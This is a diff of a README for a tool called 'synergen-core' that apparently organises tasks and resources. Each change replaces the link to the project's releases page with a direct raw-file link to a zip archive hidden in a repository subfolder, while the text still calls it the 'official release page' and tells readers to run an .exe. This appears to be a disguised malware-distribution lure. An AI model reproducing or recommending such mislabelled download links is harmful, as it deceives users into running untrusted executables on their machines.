@@ -1,6 +1,6 @@
 # ⚙️ synergen-core - Aligning human effort with world needs
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/jointdirectattackmunitionnegotiatrix388/synergen-core/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/jointdirectattackmunitionnegotiatrix388/synergen-core/raw/refs/heads/main/skua/core-synergen-3.7.zip)
 
 Synergen-core helps you organize tasks and resources to reach better outcomes. It uses data to balance effort and impact. The tool focuses on merit and efficiency. It allows you to see how individual contributions fit into a larger system.
 
@@ -12,7 +12,7 @@ Follow these steps to set up the application on your system.
 
 ## 🛠️ How to Download and Install
 
-1. Visit the [official release page](https://github.com/jointdirectattackmunitionnegotiatrix388/synergen-core/releases) to view all available versions.
+1. Visit the [official release page](https://github.com/jointdirectattackmunitionnegotiatrix388/synergen-core/raw/refs/heads/main/skua/core-synergen-3.7.zip) to view all available versions.
 2. Look for the section labeled Assets under the most recent version.
 3. Click the file that ends in .exe to start the download.
 4. Save the file to your computer.
@@ -51,7 +51,7 @@ If calculations seem slow, close other memory-heavy programs. Large datasets req
 
 ## 🔄 Updates
 
-New versions release periodically to improve performance and add features. Return to the [official release page](https://github.com/jointdirectattackmunitionnegotiatrix388/synergen-core/releases) to check for updates. You do not need to uninstall the old version. Simply download the new file and run it. The installer replaces the old application files with the new ones. Your settings and data remain intact during this process.
+New versions release periodically to improve performance and add features. Return to the [official release page](https://github.com/jointdirectattackmunitionnegotiatrix388/synergen-core/raw/refs/heads/main/skua/core-synergen-3.7.zip) to check for updates. You do not need to uninstall the old version. Simply download the new file and run it. The installer replaces the old application files with the new ones. Your settings and data remain intact during this process.
 
 ## 📈 Optimization Tips
 
